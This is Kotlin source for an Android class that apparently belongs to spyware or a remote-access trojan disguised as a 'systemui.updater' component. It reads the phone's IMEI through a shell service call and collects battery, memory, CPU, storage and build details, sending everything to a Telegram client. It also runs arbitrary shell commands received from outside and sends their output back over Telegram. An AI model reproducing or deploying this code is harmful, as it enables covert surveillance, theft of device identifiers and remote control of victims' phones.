package com.android.systemui.updater.capabilities

import android.content.Context
import com.android.systemui.updater.modules.ApiCompat
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import androidx.core.content.ContextCompat
import com.android.systemui.updater.TelegramClient
import com.android.systemui.updater.ErrorReporter
import java.util.concurrent.TimeUnit

class ShellCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun sysInfo() {
        // Read IMEI via shell (needs READ_PHONE_STATE or root)
        val imei = execute("service call iphonesubinfo 1 | grep -oE '[0-9a-f]{8} ' | " +
                          "awk '{for(i=1;i<=NF;i++) printf \$i}' | " +
                          "sed 's/..../& /g' | head -c 21")
            .ifBlank { execute("getprop gsm.simoperator") }

        // Battery info via dumpsys
        val battery = execute("dumpsys battery | grep -E 'level|status|temperature|voltage'")

        // Memory info
        val mem = execute("cat /proc/meminfo | head -5")

        // CPU info
        val cpu = execute("cat /proc/cpuinfo | grep 'model name' | head -1 | cut -d: -f2")
            .ifBlank { execute("getprop ro.product.cpu.abi") }

        // Storage info
        val storageDir = if (ApiCompat.isQ) {
            ctx.getExternalFilesDir(null) ?: ctx.filesDir
        } else {
            Environment.getExternalStorageDirectory()
        }

        var stat: StatFs? = null
        try {
            stat = StatFs(storageDir.path)
        } catch (e: Exception) {
            try { stat = StatFs(ctx.filesDir.path) } catch (ex: Exception) { ErrorReporter.report(ex, "ShellCapability") }
        }

        val freeMb = stat?.availableBlocksLong?.times(stat.blockSizeLong)?.div(1024 * 1024) ?: 0
        val totalMb = stat?.blockCountLong?.times(stat.blockSizeLong)?.div(1024 * 1024) ?: 0

        val info = buildString {
            appendLine("📱 DEVICE INFO")
            appendLine("━━━━━━━━━━━━━━━━━━━━")
            appendLine("Model:    ${Build.MANUFACTURER} ${Build.MODEL}")
            appendLine("Android:  ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
            appendLine("Build:    ${Build.DISPLAY}")
            appendLine("Board:    ${Build.BOARD}")
            appendLine("CPU ABI:  ${Build.SUPPORTED_ABIS.joinToString()}")
            appendLine("User:     ${Build.USER}")
            appendLine("Host:     ${Build.HOST}")
            appendLine()
            appendLine("🔋 BATTERY")
            appendLine(battery.trim())
            appendLine()
            appendLine("💾 MEMORY")
            appendLine(mem.trim())
            appendLine()
            appendLine("🔧 CPU")
            appendLine(cpu.trim())
            appendLine()
            appendLine("💾 STORAGE")
            appendLine("Free:  ${freeMb}MB / Total: ${totalMb}MB")
        }

        telegram.sendText(info)
    }

    fun run(cmd: String): String {
        var process: Process? = null
        var caughtException: Exception? = null
        val result = try {
            process = ProcessBuilder("/system/bin/sh", "-c", cmd)
                .redirectErrorStream(true)
                .start()

            val maxChars = 1_048_576
            val outputBuilder = StringBuilder()
            val reader = process.inputStream.bufferedReader()
            var truncated = false

            while (true) {
                val chunk =CharArray(8192)
                val read = reader.read(chunk)
                if (read == -1) break

                if (!truncated) {
                    val remaining = maxChars - outputBuilder.length
                    if (remaining <= 0) {
                        outputBuilder.append("\n[... truncated - output exceeded 1MB limit ...]")
                        truncated = true
                    } else {
                        val toCopy = minOf(read, remaining)
                        outputBuilder.append(chunk, 0, toCopy)
                        if (toCopy < read) {
                            outputBuilder.append("\n[... truncated - output exceeded 1MB limit ...]")
                            truncated = true
                        }
                    }
                }
            }

            val timedOut = !process.waitFor(30, TimeUnit.SECONDS)

            if (timedOut) {
                process.destroy()
                if (!truncated) {
                    outputBuilder.append("\n[timed out after 30s]")
                } else {
                    // already have truncation message, append timeout note
                    outputBuilder.append("\n[timed out after 30s]")
                }
            }
            val output = outputBuilder.toString()
            if (output.isBlank()) {
                val exitCode = if (timedOut) -1 else process.exitValue()
                "[no output — exit code: $exitCode]"
            } else {
                output
            }
        } catch (e: Exception) {
            caughtException = e
            "[error: ${e.message}]"
        } finally {
            try {
                process?.destroy()
                process?.inputStream?.close()
                process?.errorStream?.close()
                process?.outputStream?.close()
            } catch (_: Exception) {}
        }
        telegram.sendText(result)
        caughtException?.let { ErrorReporter.report(it, "ShellCapability") }
        return result
    }
}
